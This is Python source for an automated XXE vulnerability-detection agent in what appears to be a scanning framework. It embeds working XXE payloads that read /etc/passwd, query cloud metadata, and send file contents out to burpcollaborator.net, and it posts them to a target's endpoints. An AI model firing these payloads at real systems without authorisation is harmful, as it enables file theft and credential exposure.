"""
XXE (XML External Entity) Injection detection agent
"""

import asyncio
from typing import List
import httpx
from itzraven.agents.base_agent import BaseAgent, AgentResult, Finding, AgentStatus
from itzraven.core.logger import get_logger

logger = get_logger()


class XXEAgent(BaseAgent):
    """Agent for detecting XXE injection vulnerabilities"""

    def __init__(self, target: str, event_bus=None, memory_manager=None):
        super().__init__("XXE Agent", target, event_bus=event_bus, memory_manager=memory_manager)
        self.payloads = [
            {
                "name": "basic_xxe",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
                "indicators": ["root:x:", "/bin/bash", "/bin/sh", "nobody:x:"],
            },
            {
                "name": "xxe_oob",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]>
<root>test</root>''',
                "indicators": ["localhost", "hostname"],
            },
            {
                "name": "xxe_parameter_entity",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://169.254.169.254/latest/meta-data/">
%dtd;]>
<root>test</root>''',
                "indicators": ["ami-id", "instance-id", "root:x:"],
            },
            {
                "name": "xxe_error_based",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;]>
<root>test</root>''',
                "indicators": ["root:x:", "file not found", "No such file"],
            },
            {
                "name": "xxe_xinclude",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>''',
                "indicators": ["root:x:", "/bin/bash"],
            },
            {
                "name": "xxe_svg",
                "content_type": "image/svg+xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>''',
                "indicators": ["root:x:", "/bin/bash", "nobody"],
            },
            {
                "name": "xxe_php_wrapper",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',
                "indicators": ["cm9vd", "YW5vbnl", "bm9ib2R5"],
            },
            {
                "name": "xxe_blind_param_entity",
                "content_type": "application/xml",
                "body": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://burpcollaborator.net/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>''',
                "indicators": None,
                "out_of_band": True,
            },
        ]
        self.xxe_endpoints = [
            "/api/xml", "/xml", "/soap", "/api/soap", "/webservice",
            "/api/upload", "/upload", "/import", "/api/import",
            "/api/parse", "/parse", "/rss", "/feed",
        ]

    async def execute(self) -> AgentResult:
        logger.info(f"{self.name}: Testing {self.target}")

        await self._test_post_xml()
        await self._test_content_type_switch()
        await self._test_file_upload_xxe()
        await self._run_nuclei_tags(tags=["xxe", "xml-external-entity", "oob-xxe"], severity="high")

        return AgentResult(
            agent_name=self.name,
            status=self.status,
            findings=self.findings,
            execution_time=0,
        )

    async def _test_post_xml(self) -> None:
        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
            base = self.target.rstrip("/")
            for path in self.xxe_endpoints:
                url = f"{base}{path}"
                for payload in self.payloads:
                    try:
                        if payload.get("out_of_band"):
                            continue
                        headers = {"Content-Type": payload["content_type"]}
                        response = await client.post(url, content=payload["body"], headers=headers)
                        if self._detect_xxe(response.text, payload["indicators"]):
                            self.add_finding(Finding(
                                title=f"XXE Injection at {path}",
                                description=f"XXE vulnerability detected using {payload['name']} technique",
                                severity="critical",
                                category="injection",
                                evidence=f"Response contains file contents. Status: {response.status_code}",
                                proof_of_concept=f"POST {url} with XXE payload: {payload['name']}",
                                remediation="Disable XML external entity processing. Use secure XML parsers.",
                                confidence=0.9,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing XXE at {url}: {e}")

    async def _test_content_type_switch(self) -> None:
        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                for payload in self.payloads[:4]:
                    try:
                        if payload.get("out_of_band"):
                            continue
                        headers = {"Content-Type": "text/xml"}
                        response = await client.post(url, content=payload["body"], headers=headers)
                        if self._detect_xxe(response.text, payload["indicators"]):
                            self.add_finding(Finding(
                                title=f"XXE via Content-Type Switch at {url}",
                                description=f"XXE by switching content-type to text/xml using {payload['name']}",
                                severity="critical",
                                category="injection",
                                evidence=f"File content leaked via content-type switch. Status: {response.status_code}",
                                proof_of_concept=f"POST {url} with Content-Type: text/xml and XXE payload",
                                remediation="Validate Content-Type headers. Disable external entities.",
                                confidence=0.85,
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"Error testing CT switch XXE: {e}")

    async def _test_file_upload_xxe(self) -> None:
        async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
            test_urls = self.get_test_urls()
            for url in test_urls:
                svg_payload = self.payloads[5]
                try:
                    files = {"file": ("test.svg", svg_payload["body"], "image/svg+xml")}
                    response = await client.post(url.rstrip("/") + "/upload", files=files)
                    if self._detect_xxe(response.text, svg_payload["indicators"]):
                        self.add_finding(Finding(
                            title="XXE via SVG File Upload",
                            description="XXE injection via SVG file upload with entity reference",
                            severity="critical",
                            category="injection",
                            evidence=f"Server processed SVG XXE payload. Status: {response.status_code}",
                            proof_of_concept="Upload SVG with embedded XXE payload",
                            remediation="Sanitize uploaded SVG files. Disable entity parsing.",
                            confidence=0.85,
                        ))
                except Exception as e:
                    logger.debug(f"Error testing SVG XXE upload: {e}")

    def _detect_xxe(self, response_text: str, indicators: List[str]) -> bool:
        if not indicators:
            return False
        response_lower = response_text.lower()
        return any(indicator.lower() in response_lower for indicator in indicators)
